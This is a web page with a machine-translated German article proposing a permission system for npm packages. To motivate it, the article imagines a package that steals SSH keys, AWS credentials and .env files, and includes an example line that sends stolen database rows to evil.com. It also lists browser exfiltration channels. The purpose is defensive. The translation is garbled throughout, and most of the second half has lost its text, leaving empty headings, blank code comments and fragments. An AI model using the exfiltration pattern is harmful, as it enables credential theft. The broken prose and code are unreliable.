<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👲 👨🏿‍🤝‍👨🏽 👘 Haben Sie eine Idee: Berechtigungssystem für npm-Pakete 👩🏽‍✈️ 🔌 🐞</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Vor einigen Tagen habe ich den Taschenrechner zum ersten Mal auf einem neuen Telefon gestartet und die folgende Meldung angezeigt: "Der Taschenrechner...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Haben Sie eine Idee: Berechtigungssystem für npm-Pakete</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ruvds/blog/433010/">  Vor einigen Tagen habe ich den Taschenrechner zum ersten Mal auf einem neuen Telefon gestartet und die folgende Meldung angezeigt: "Der Taschenrechner möchte auf Ihre Kontakte zugreifen." <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/bc6/ab2/2fb/bc6ab22fbd46e2703b3d248480a389cf.png"></div><br>  Zuerst schien mir diese Nachricht ein wenig traurig zu sein (es schien, dass der Taschenrechner einsam war), aber dieser Fall brachte mich zum Nachdenken ... <br><a name="habracut"></a><br>  Was wäre, wenn npm-Pakete wie Telefonanwendungen die für ihre Arbeit erforderlichen Berechtigungen deklarieren müssten?  Bei diesem Ansatz <code>package.json</code> Paketdatei <code>package.json</code> möglicherweise folgendermaßen aus: <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"name"</span></span>: <span class="hljs-string"><span class="hljs-string">"fancy-logger"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"version"</span></span>: <span class="hljs-string"><span class="hljs-string">"0.1.0"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"permissions"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"browser"</span></span>: [<span class="hljs-string"><span class="hljs-string">"network"</span></span>],   <span class="hljs-attr"><span class="hljs-attr">"node"</span></span>: [<span class="hljs-string"><span class="hljs-string">"http"</span></span>, <span class="hljs-string"><span class="hljs-string">"fs"</span></span>] }, <span class="hljs-attr"><span class="hljs-attr">"etcetera"</span></span>: <span class="hljs-string"><span class="hljs-string">"etcetera"</span></span> }</code> </pre> <br>  Auf <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">npmjs.com könnte ein</a> Abschnitt der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Paketseite</a> mit Informationen zu den erforderlichen Berechtigungen so aussehen. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/9ab/9e6/76d/9ab9e676da3e313c47d59e564afd21bc.png"></div><br>  <i>Ein solcher Berechtigungsabschnitt ist möglicherweise für Pakete auf der npm-Registrierungssite verfügbar.</i> <br>  Solche Berechtigungslisten für ein Paket können eine Kombination der Berechtigungen aller Abhängigkeiten mit eigenen Berechtigungen sein. <br><br>  Ein Blick auf den Inhalt des <code>permissions</code> des <code>fancy-logger</code> Pakets lässt den Entwickler möglicherweise darüber nachdenken, warum das Paket, das etwas in die Konsole schreibt, Zugriff auf das <code>http</code> Modul benötigt und dass dies etwas verdächtig aussieht. <br><br>  In welcher Welt würde ein ähnliches Berechtigungssystem für npm-Pakete verwendet?  Vielleicht wird jemand den Sinn darin nicht erkennen, da er sich beispielsweise völlig sicher fühlt, wenn er nur zuverlässige Pakete von bewährten Verlagen verwendet.  Damit sich jeder, der dies liest, verwundbar fühlt, hier eine kurze Geschichte. <br><br><h2>  <font color="#3AC1EF">Die Geschichte, wie ich Ihre Umgebungsvariablen stehle</font> </h2><br>  Ich wollte ein npm-Paket namens <code>space-invaders</code> erstellen.  Es war interessant zu lernen, wie man Spiele macht, indem man ein Spiel schreibt, das in der Konsole funktioniert, und gleichzeitig meinen Standpunkt zu Schwachstellen im Zusammenhang mit npm-Paketen zu untermauern. <br><br>  Sie können dieses Spiel mit dem folgenden Befehl <code>npx space-invaders</code> : <code>npx space-invaders</code> .  Nach dem Start konnte man sofort auf die Aliens schießen und die Zeit töten. <br><br>  Du möchtest dieses Spiel, du würdest es mit Freunden teilen, sie würden es auch mögen. <br><br>  All dies sieht sehr positiv aus, aber, um Sie zu unterhalten, werden die <code>space-invaders</code> des Spiels ihr eigenes <code>space-invaders</code> , nämlich das Sammeln einiger Daten.  Es sammelt Informationen von <code>~/.ssh/</code> , <code>~/.aws/credentials</code> , von <code>~/.bash_profile</code> und anderen ähnlichen Stellen und liest den Inhalt aller <code>.env</code> Dateien, die es erreichen kann, einschließlich <code>process.env</code> , look zur Git-Konfiguration (um herauszufinden, wessen Informationen sie sammelt), und dann sendet sie alles an meinen Server. <br><br>  Ich habe noch kein solches Spiel geschrieben, aber seit einiger Zeit fühle ich mich unwohl. Wenn ich den Befehl <code>npm install</code> ausführe, denke ich darüber nach, wie anfällig mein System ist.  Wenn ich mir nun die Fortschrittsanzeige der Installation anschaue, denke ich darüber nach, wie viele Standardordner und -dateien auf meinem Laptop vorhanden sind, deren Inhalt nicht in die falschen Hände geraten sollte. <br><br>  Und es geht nicht nur um meinen Arbeitsbereich.  Beispielsweise weiß ich nicht einmal, ob in einigen Umgebungsvariablen meines Site Assembly-Systems Daten für die Verbindung zur Produktionsserverdatenbank vorhanden sind.  Wenn irgendwo solche Daten vorhanden sind, können Sie sich eine Situation vorstellen, in der ein böswilliges npm-Paket ein Skript auf dem System installiert, das für die Verbindung mit meiner Arbeitsdatenbank ausgelegt ist.  Anschließend führt dieses Skript den Befehl <code>SELECT * from users</code> und anschließend <code>http.get('http://evil.com/that-data')</code> .  Vielleicht bin ich gerade wegen der Möglichkeit solcher Angriffe auf den Rat gestoßen, Passwörter nicht im Klartext in Datenbanken zu speichern? <br><br>  All dies sieht ziemlich beängstigend aus und geschieht höchstwahrscheinlich bereits (obwohl es unmöglich ist, genau zu sagen, ob dies geschieht oder nicht). <br><br>  Damit hören wir vielleicht auf, über die Folgen des Diebstahls wichtiger Daten zu sprechen.  Kommen wir zurück zum Thema Berechtigungen für npm-Pakete. <br><br><h2>  <font color="#3AC1EF">Berechtigungsänderungen sperren</font> </h2><br>  Ich nehme an, es wäre großartig, die vom Paket benötigten Berechtigungen beim Anzeigen der npm-Site sehen zu können.  Es sollte jedoch beachtet werden, dass die Fähigkeit, Berechtigungen anzuzeigen, nur dann gut ist, wenn sie auf einen bestimmten Zeitpunkt angewendet werden. Tatsächlich löst dies nicht das eigentliche Problem. <br><br>  Bei einem kürzlich in npm aufgetretenen Vorfall veröffentlichte jemand zuerst eine Patch-Version eines Pakets mit Schadcode und anschließend eine Nebenversion, aus der der Schadcode bereits entfernt worden war.  Die Zeit zwischen diesen beiden Ereignissen reichte aus, um viele Benutzer des gefährlichen Pakets zu gefährden. <br><br>  Das ist das Problem.  Keine Pakete, die von Malware erstellt wurden und dies immer bleiben.  Das Problem ist, dass Sie in einem scheinbar zuverlässigen Paket leise etwas Schlechtes hinzufügen und nach einer Weile daraus entfernen können. <br><br>  Infolgedessen können wir sagen, dass wir einen Mechanismus benötigen, um die von Paketen empfangenen Berechtigungen zu blockieren. <br><br>  Möglicherweise handelt es sich um eine Datei <code>package-permissions.json</code> , die Berechtigungen für Node.js und für den Browser festlegt und eine Liste von Paketen enthält, die diese Berechtigungen benötigen.  Bei diesem Ansatz müssten alle Pakete in einer solchen Datei <code>package.json</code> werden, und nicht nur diejenigen, die sich im Abschnitt " <code>dependencies</code> " der Datei <code>package.json</code> des Projekts befinden. <br><br>  So könnte die Datei <code>package-permissions.json</code> aussehen. <br><br><pre> <code class="json hljs">{ <span class="hljs-attr"><span class="hljs-attr">"node"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"http"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"express"</span></span>,     <span class="hljs-string"><span class="hljs-string">"stream-http"</span></span>   ],   <span class="hljs-attr"><span class="hljs-attr">"fs"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"fs-extra"</span></span>,     <span class="hljs-string"><span class="hljs-string">"webpack"</span></span>,     <span class="hljs-string"><span class="hljs-string">"node-sass"</span></span>   ] }, <span class="hljs-attr"><span class="hljs-attr">"browser"</span></span>: {   <span class="hljs-attr"><span class="hljs-attr">"network"</span></span>: [     <span class="hljs-string"><span class="hljs-string">"whatwg-fetch"</span></span>,     <span class="hljs-string"><span class="hljs-string">"new-relic"</span></span>   ] } }</code> </pre> <br>  Eine echte Version einer solchen Datei könnte viel mehr Paketeinträge enthalten. <br><br>  Stellen Sie sich nun vor, Sie aktualisieren eines Tages ein Paket mit zweihundert Abhängigkeiten, das ebenfalls aktualisiert wird.  Für eine dieser Abhängigkeiten wurde eine Patch-Version veröffentlicht, für die plötzlich Zugriff auf <code>http</code> Node.js erforderlich war. <br><br>  In diesem <code>npm install</code> Befehl <code>npm install</code> mit einer Meldung ähnlich der folgenden fehl: „Das vom <code>fancy-logger</code> <code>add-two-number</code> Paket benötigte <code>add-two-number</code> <code>fancy-logger</code> Paket hat den Zugriff auf <code>http</code> Node.js angefordert.  Führen Sie den Befehl <code>npm update-permissions add-two-numbers</code> , um dieses Problem zu beheben, und führen Sie dann den Befehl <code>npm install</code> erneut aus. “ <br><br>  In diesem <code>package.json</code> ist <code>fancy-logger</code> das Paket in Ihrer <code>package.json</code> Datei (vorausgesetzt, Sie sind mit diesem Paket vertraut), und das <code>add-two-numbers</code> <code>package.json</code> <code>add-two-numbers</code> Paket ist eine <code>fancy-logger</code> Abhängigkeit, von der Sie noch nie gehört haben. <br><br>  Selbst wenn sich im System eine Datei befindet, mit der die Abhängigkeiten blockiert werden können, bestätigen einige Entwickler die neuen Berechtigungen, ohne an irgendetwas zu denken.  Zumindest wird jedoch eine Änderung in <code>package-permissions.json</code> in der Pull-Anforderung sichtbar sein, dh es besteht die Möglichkeit, dass ein anderer verantwortungsbewussterer Entwickler darauf achtet. <br><br>  Darüber hinaus würde eine Änderung der angeforderten Berechtigungen erfordern, dass die npm-Registrierung selbst Paketautoren benachrichtigt, wenn sich eine Situation irgendwo im Abhängigkeitsbaum ihrer Pakete ändert.  Vielleicht - dies erfolgt per E-Mail mit folgenden Inhalten: <br><br>  "Hallo, Autor von <code>fancy-logger</code> .  Wir informieren Sie, dass <code>add-two-number</code> , das Paket, dessen Funktionen Sie verwenden, die Erlaubnis zur Arbeit mit dem <code>http</code> Modul angefordert hat.  Ihre Paketberechtigungen, wie auf <code>npmjs.com/package/fancy-logger</code> , wurden entsprechend aktualisiert. “ <br><br>  Dies wird natürlich die Arbeit sowohl der Autoren der Pakete als auch von npm selbst ergänzen, aber diese Dinge werden es wert sein, ein wenig Zeit damit zu verbringen.  In diesem Fall kann der Autor von <code>add-two-numbers</code> absolut sicher sein, dass, wenn er um Erlaubnis zur Arbeit mit dem <code>http</code> Modul bittet, dies zur Auslösung vieler "Alarme" auf der ganzen Welt führt. <br><br>  Das brauchen wir.  Huh?  Ich möchte hoffen, dass Pakete, die weniger Berechtigungen erfordern, wie bei Telefonanwendungen und sogar bei Erweiterungen für Chrome bei Benutzern beliebter sind als solche, die einen unerklärlich hohen Zugriff auf Systeme benötigen.  Dies wiederum lässt Paketautoren bei der Auswahl der für ihre Entwicklung erforderlichen Berechtigungen sehr gut nachdenken. <br><br>  Angenommen, npm beschließt, ein Berechtigungssystem einzuführen.  Am ersten Tag nach dem Start eines solchen Systems wird davon ausgegangen, dass für alle Pakete vollständige Berechtigungen erforderlich sind (eine solche Entscheidung wird später getroffen - in Fällen, in denen der Abschnitt mit den <code>permissions</code> in <code>package.json</code> fehlt). <br><br>  Der Autor des Pakets, der behaupten möchte, dass für sein Paket keine besonderen Berechtigungen erforderlich sind, möchte den Abschnitt " <code>permissions</code> " in <code>package.json</code> als leeres Objekt hinzufügen.  Und wenn die Autoren der Pakete so interessiert sind, dass Abhängigkeitsberechtigungen ihre Pakete nicht „belasten“, versuchen sie sicherzustellen, dass diese Abhängigkeitspakete auch keine besonderen Berechtigungen erfordern, indem sie beispielsweise entsprechende Pull-Anforderungen im Abhängigkeitsrepository stellen. <br><br>  Darüber hinaus bemüht sich jeder Autor des Pakets, das Risiko einer Sicherheitsanfälligkeit seines Pakets zu verringern, wenn eine seiner Abhängigkeiten aufgehoben wird.  Wenn die Autoren der Pakete Abhängigkeiten verwenden, für die Berechtigungen erforderlich sind, die anscheinend nicht benötigt werden, besteht daher ein Anreiz, auf die Verwendung anderer Pakete umzusteigen. <br><br>  Und im Fall von Entwicklern, die beim Erstellen von Anwendungen npm-Pakete verwenden, werden sie gezwungen, den in ihren Projekten verwendeten Paketen besondere Aufmerksamkeit zu widmen und hauptsächlich diejenigen auszuwählen, für die keine besonderen Berechtigungen erforderlich sind.  Gleichzeitig erfordern einige Pakete aus objektiven Gründen Berechtigungen, die Probleme verursachen können, aber solche Pakete werden wahrscheinlich von den Entwicklern speziell kontrolliert. <br><br>  Vielleicht kann so etwas wie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Greenkeeper</a> irgendwie helfen, all diese Probleme zu lösen. <br><br>  Schließlich bietet die Datei <code>package-permissions.json</code> eine leicht verständliche Zusammenfassung für einen Sicherheitsexperten, der potenzielle „Lücken“ in der Anwendung bewertet und es Ihnen ermöglicht, spezifische Fragen zu kontroversen Paketen und deren Berechtigungen zu stellen. <br><br>  Infolgedessen hoffe ich, dass sich diese einfache <code>permissions</code> ungefähr 800.000 npm-Pakete ziemlich weit ausbreiten und npm sicherer machen kann. <br><br>  Dies wird natürlich mögliche Angriffe nicht verhindern.  Ebenso wie die von mobilen Anwendungen angeforderten Berechtigungen es nicht unmöglich machen, bösartige mobile Anwendungen zu erstellen, die über offizielle Websites verbreitet werden.  Dies wird jedoch die „Angriffsfläche“ auf Pakete beschränken, die ausdrücklich um Erlaubnis bitten, bestimmte Aktionen auszuführen, die eine Bedrohung für Computersysteme darstellen könnten.  Darüber hinaus wird es interessant sein zu erfahren, wie viel Prozent der Pakete überhaupt keine besonderen Berechtigungen benötigen. <br><br>  So sieht der Mechanismus für die Arbeit mit Berechtigungen für npm-Pakete aus, den ich mir ausgedacht habe.  Wenn diese Idee Wirklichkeit wird, können wir uns entweder darauf verlassen, dass die Angreifer ihre Pakete ehrlich beschreiben, indem sie Berechtigungen deklarieren, oder das System der Deklaration von Berechtigungen mit dem Mechanismus der erzwungenen Einschränkung der Funktionen von Paketen gemäß den von ihnen angeforderten Berechtigungen kombinieren.  Dies ist eine interessante Frage.  Schauen wir uns das an, wie es auf Node.js und Browser angewendet wird. <br><br><h2>  <font color="#3AC1EF">Erzwingen von Paketbeschränkungen gemäß den von ihnen in Node.js angeforderten Berechtigungen</font> </h2><br>  Hier sehe ich zwei mögliche Optionen für die Anwendung solcher Einschränkungen. <br><br><h3>  <font color="#3AC1EF">▍ Option 1: Spezielles npm-Paket, das Sicherheitsmaßnahmen erzwingt</font> </h3><br>  Stellen Sie sich ein Paket vor, das von npm (oder einer anderen Organisation, die gleichermaßen maßgeblich und visionär ist) erstellt und verwaltet wird.  Lassen Sie dieses Paket <code>@npm/permissions</code> heißen. <br><br>  Ein solches Paket würde entweder mit dem ersten Importbefehl im Anwendungscode enthalten sein, oder Anwendungen würden mit einem Befehl des Formularknotens <code>node -r @npm/permissions index.js</code> . <br><br>  Ein Paket würde andere Importbefehle überschreiben, damit sie nicht die im Abschnitt " <code>permissions</code> " von <code>package.json</code> Dateien anderer Pakete angegebenen <code>permissions</code> verletzen.  Wenn der Autor eines bestimmten <code>lovely-logger</code> Pakets die Notwendigkeit für dieses Paket im <code>http</code> Modul Node.js nicht angegeben hat, bedeutet dies, dass dieses Modul nicht auf ein solches Paket zugreifen kann. <br><br>  Streng genommen ist es nicht ideal, ganze Node.js-Module auf diese Weise zu blockieren.  Beispielsweise lädt das npm- <code>methods</code> das <code>http</code> Modul Node.js, sendet jedoch keine Daten damit.  Es nimmt nur das <code>http.METHODS</code> Objekt, konvertiert seinen Namen in <code>http.METHODS</code> und exportiert es als klassisches npm-Paket.  Jetzt scheint ein solches Paket ein großartiges Ziel für einen Angreifer zu sein - er hat 6 Millionen Downloads pro Woche, während er sich seit 3 ​​Jahren nicht geändert hat.  Ich könnte den Autoren dieses Pakets schreiben und sie einladen, mir das Repository zu geben. <br><br>  In Anbetracht des <code>methods</code> ist es besser zu berücksichtigen, dass keine <code>network</code> erforderlich ist und keine Berechtigung, die den Zugriff auf das <code>http</code> Modul ermöglicht.  Diese Einschränkung kann dann mithilfe eines externen Mechanismus behoben werden und alle Versuche dieses Pakets neutralisiert werden, bestimmte Daten von den Systemen zu senden, auf denen es funktioniert. <br><br>  Das imaginäre Paket <code>@npm/permissions</code> kann auch den Zugriff von einem Paket auf andere Pakete beschränken, die nicht als Abhängigkeiten aufgeführt sind.  Dies verhindert beispielsweise, dass das Paket so etwas wie <code>fs-extra</code> und <code>request</code> importiert, und nutzt die Funktionen dieser Pakete, um Daten aus dem Dateisystem zu lesen und gelesene Daten an einen Angreifer zu senden. <br><br>  Ebenso kann es nützlich sein, zwischen "internem" und "externem" Festplattenzugriff zu unterscheiden.  Ich bin ziemlich froh, dass das <code>node-sass</code> Zugriff auf Materialien benötigt, die sich im Verzeichnis meines Projekts befinden, aber ich sehe keine Gründe, warum dieses Paket Zugriff auf etwas außerhalb dieses Verzeichnisses benötigt. <br><br>  Möglicherweise muss zu Beginn der Einführung des <code>@npm/permissions</code> Paket <code>@npm/permissions</code> manuell zu Projekten hinzugefügt werden.  Vielleicht ist dies während der Übergangszeit, während der Beseitigung unvermeidlicher Fehlfunktionen, der einzig vernünftige Ansatz zur Verwendung eines solchen Mechanismus.  Um jedoch echte Sicherheit zu gewährleisten, muss dieses Paket eng in das System integriert sein, da bei der Ausführung von Paketinstallationsskripten die Berechtigungen berücksichtigt werden müssen. <br><br>  Dann stellt sich höchstwahrscheinlich heraus, dass ein einfacher Befehl der Form <code>"enforcePermissions": true</code> von <code>"enforcePermissions": true</code> in der Datei <code>package.json</code> des Projekts npm <code>package.json</code> , alle Skripte mit der erzwungenen Verwendung der von ihnen deklarierten Berechtigungen auszuführen. <br><br><h3>  <font color="#3AC1EF">▍ Option 2: Node.js im abgesicherten Modus</font> </h3><br>  Die spezielle Funktionsweise von Node.js, die auf ein höheres Sicherheitsniveau ausgerichtet ist, erfordert offensichtlich ernstere Änderungen.  Aber auf lange Sicht kann die Node.js-Plattform selbst möglicherweise Einschränkungen durchsetzen, die durch die von jedem Paket deklarierten Berechtigungen festgelegt werden. <br><br>  Einerseits weiß ich, dass diejenigen, die die Node.js-Plattform entwickeln, sich bemühen, die Probleme dieser Plattform zu lösen, und meine Vorstellungen über die Sicherheit von npm-Paketen gehen über den Rahmen ihrer Interessen hinaus.  Letztendlich ist npm nur die Technologie, die Node.js begleitet.  Auf der anderen Seite sind die Entwickler von Node.js daran interessiert, dass sich Unternehmensbenutzer sicher fühlen, mit dieser Plattform zu arbeiten, und Sicherheit ist vermutlich einer der Aspekte von Node.js, die der „Community“ nicht gegeben werden sollten. <br><br>  Während also alles, worüber wir sprachen, ziemlich einfach aussah und sich darauf beschränkte, dass das System auf die eine oder andere Weise den Fähigkeiten folgen würde, die von den Modulen während des Betriebs von Node.js verwendet wurden. <br><br>  Lassen Sie uns nun über Browser sprechen.  Hier sieht alles nicht so klar und verständlich aus. <br><br><h2>  <font color="#3AC1EF">Erzwungene Einschränkung der Funktionen von Paketen gemäß den angeforderten Berechtigungen in Browsern</font> </h2><br>  Auf den ersten Blick sieht die erzwungene Einschränkung der Funktionen von Paketen in Browsern noch einfacher aus, da der im Browser ausgeführte Code insbesondere in Bezug auf das Betriebssystem, auf dem der Browser ausgeführt wird, nicht viel bewirken kann.  Tatsächlich müssen Sie sich bei Browsern nur um die Fähigkeit von Paketen kümmern, Daten an ungewöhnliche Adressen zu übertragen. <br><br>  Das Problem hierbei ist, dass es unzählige Möglichkeiten gibt, Daten vom Browser des Benutzers an den Server des Angreifers zu senden. <br><br>  Dies wird als Exfiltration oder Datenleckage bezeichnet. Wenn Sie einen Sicherheitsexperten fragen, wie dies vermieden werden kann, wird er Sie mit dem Aussehen der Person, die das Schießpulver erfunden hat, auffordern, die Verwendung von npm einzustellen. <br><br>  Ich glaube, dass Sie bei Paketen, die in Browsern ausgeführt werden, nur auf eine Auflösung achten müssen - diejenige, die für die Fähigkeit verantwortlich ist, mit dem Netzwerk zu arbeiten.  Nennen wir es <code>network</code> .  In dieser Umgebung gibt es möglicherweise andere Berechtigungen (z. B. solche, die den Zugriff auf das DOM oder den lokalen Speicher regeln). Hier gehe ich jedoch davon aus, dass unser Hauptanliegen die Möglichkeit eines Datenverlusts ist. <br><br>  Daten aus dem Browser können auf viele Arten "entfernt" werden.  Hier sind die, an die ich mich in 60 Sekunden erinnern konnte: <br><br><ul><li>  API- <code>fetch</code> . </li><li>  Web Sockets </li><li>  WebRTC-Technologie. </li><li>  Konstruktor von <code>EventSource</code> . </li><li>  <code>XMLHttpRequest</code> API </li><li>  Festlegen der <code>innerHTML</code> Eigenschaft verschiedener Elemente (Sie können neue Elemente erstellen). </li><li>  Erstellen eines Bildobjekts mit dem <code>new Image()</code> Befehl <code>new Image()</code> (die Eigenschaft <code>src</code> eines Bildes kann als Mittel zum Exfiltrieren von Daten dienen). </li><li>  Festlegen von <code>document.location</code> , <code>window.location</code> usw. </li><li>  Ändern der <code>src</code> Eigenschaften eines vorhandenen Bildes, <code>iframe</code> oder ähnliches. </li><li>  Änderungen an der <code>target</code> des <code>&lt;form&gt;</code> -Elements. </li><li>  Verwenden einer clever gestalteten Zeichenfolge, um auf einen der oben genannten Mechanismen zuzugreifen oder auf etwas <code>top</code> oder <code>self</code> anstelle von <code>windows</code> zuzugreifen. </li></ul><br>  Es ist zu beachten, dass eine gute Content Security Policy (CSP) einige dieser Bedrohungen neutralisieren kann, dies gilt jedoch nicht für alle.  Wenn mich jemand korrigieren kann, bin ich glücklich, aber ich glaube, dass Sie sich niemals darauf verlassen können, dass CSP Sie vollständig vor Datenlecks schützt.  Eine Person hat mir einmal erzählt, dass CSP einen nahezu vollständigen Schutz vor einer Vielzahl von Bedrohungen bietet.  Darauf antwortete ich, dass Sie nicht ein wenig schwanger sein können, und seitdem haben wir nicht mehr mit dieser Person kommuniziert. <br><br>  Wenn Sie sich der Suche nach Möglichkeiten zum Stehlen von Daten aus dem Browser mit Bedacht nähern, ist es sicher ziemlich realistisch, eine ziemlich vollständige Liste dieser Methoden zu erstellen. <br><br>  Jetzt müssen wir einen Mechanismus finden, der den Zugang zur Nutzung von Möglichkeiten aus einer solchen Liste verbietet. <br><br>        Webpack (,    <code>@npm/permissions-webpack-plugin</code> ),     : <br><br><ul><li>         <code>browser</code>  <code>package-permissions.json</code>   ,  npm-      (  -  ,  ). </li><li>  ,   ,     ,        API,        . </li></ul><br> (,       Parcel, Rollup, Browserify     ). <br><br> , ,     -.    ,          ,        , , ,        . <br><br>   ,        ( Lodash, Moment,   ),       .        . <br><br>            . <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//   (),   ,    function bigFrameworkWrapper(newWindow) { /*  --     -- */ const window = newWindow; const document = window.document; //      /*  --    -- */ const module = {   doSomething() {     const newDiv = document.createElement('div'); //      const newScript = document.createElement('script'); //      const firstDiv = document.querySelector('div'); //    }, }; return module; } //   ( ),   ,    function smallUtilWrapper(newWindow) { /*  --     -- */ const window = newWindow; const document = window.document; //      /*  --    -- */ const module = {   doSomething() {     const newDiv = document.createElement('div'); //      const newScript = document.createElement('script'); //  !     const firstDiv = document.querySelector('div'); //    }, }; return module; } const restrictedWindow = new Proxy(window, { get(target, prop, receiver) {   if (prop === 'document') {     return new Proxy(target.document, {       get(target, prop, receiver) {         if (prop === 'createElement') {           return new Proxy(window.document.createElement, {             apply(target, thisArg, argumentsList) {               if (['script', 'img', 'audio', 'and-so-on'].includes(argumentsList[0])) {                 console.error('A module without permissions attempted to create a naughty element');                 return false;               }               return target.apply(window.document, argumentsList);             },           });         }         const result = Reflect.get(target, prop, receiver);         if (typeof result === 'function') return result.bind(target);         return result;       },     });   }   return Reflect.get(target, prop, receiver); }, }); const bigFramework = bigFrameworkWrapper(window); bigFramework.doSomething(); //   const smallUtil = smallUtilWrapper(restrictedWindow); smallUtil.doSomething(); // ! "A module without permissions attempted to create a naughty element"</span></span></code> </pre> <br>  <code>function bigFrameworkWrapper(newWindow) {</code>  <code>function smallUtilWrapper(newWindow) {</code> —  ,    .  «»      . <br><br>   <code>const newScript = document.createElement('script'); //  !</code>  ,         —    <code>script</code> . <br><br>   <code>const bigFramework = bigFrameworkWrapper(window);</code>  <code>const smallUtil = smallUtilWrapper(restrictedWindow);</code>  «»     . ,      ,    . <br><br>   <code>const restrictedWindow = new Proxy(window, {</code>    <code>window</code> ,    ,     <code>window</code> ,   ,           <code>window.document.createElement</code>    DOM  . <br><br>     <code>Proxy</code> . <br><br>       .         ,           . <br><br> ,   ,       API,      .   ,     ,   ,  ,  ,     ,        ,    ,   ,     ,  «»   . <br><br>      ,   ,     ,   -     . <br><br> , ,  ,        ,       <code>Proxy</code> . ,      90% ,   .        ,         ,   . ,    -   ,             ,   ,  . <br><br>  ,   , ,       ,     ,              Node.js       . <br><br><h2> <font color="#3AC1EF"> </font> </h2><br>  ,   ,    HTTP   ,  , ,          -.  Das ist verständlich. <br><br>     -,   ,  ,              .    <code>iframe</code> ,    .     <code>sandbox</code> ,    ,     .  ,    ,   ,     -. <br><br> ,   ,     <code>sandbox</code>  <code>&lt;script&gt;</code> .     : <code>&lt;script src="/some-package.js" sandbox="allow-exfiltration allow-whatevs"&gt;&lt;script&gt;</code> .      ,       ,      ,      - <code>create-react-app</code> ,   1.4   ,          . <br><br>     ,            npm  ,      . <br><br>  ,      -  . <br><br> ,  ,    -    « ...»,     ,   ,       ? <br><br><h2> <font color="#3AC1EF"></font> </h2><br>  ,   ,     , ,              .      ,  90% ,   ,    ,    10% — ,    . <br><br> ,          ,           -  . <br><br>  <b>Liebe Leser!</b>   ,  ,       npm,   -? <br><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><img src="https://habrastorage.org/files/1ba/550/d25/1ba550d25e8846ce8805de564da6aa63.png"></a> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de433010/">https://habr.com/ru/post/de433010/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de432998/index.html">Weihnachtsgeschichte</a></li>
<li><a href="../de433000/index.html">Kotlin kompilieren: JetBrains VS ANTLR VS JavaCC</a></li>
<li><a href="../de433002/index.html">Komm selbst ... oder die Kommunikationsregeln in einem Team</a></li>
<li><a href="../de433004/index.html">Eine robuste Cloud-Migrationsstrategie für 2019: 7 Tipps</a></li>
<li><a href="../de433008/index.html">USB-Geräte sind eine "plötzliche" Bedrohung</a></li>
<li><a href="../de433012/index.html">Vielleicht lebe ich nur wegen ihr: Warum verlassen sich Patienten mit Apnoe auf ein Programm, das von einem Hacker geschrieben wurde?</a></li>
<li><a href="../de433014/index.html">Witze über die jüngste Freilassung von Astronauten in den Weltraum</a></li>
<li><a href="../de433016/index.html">Schnittstellenänderungen, mehrschichtige Animationen und strukturiertes visuelles Chaos: Ein Überblick über Webtrends für 2019</a></li>
<li><a href="../de433018/index.html">UDB. Was ist das Teil 2. Datenpfad</a></li>
<li><a href="../de433030/index.html">Live: Front-End-Leistung</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
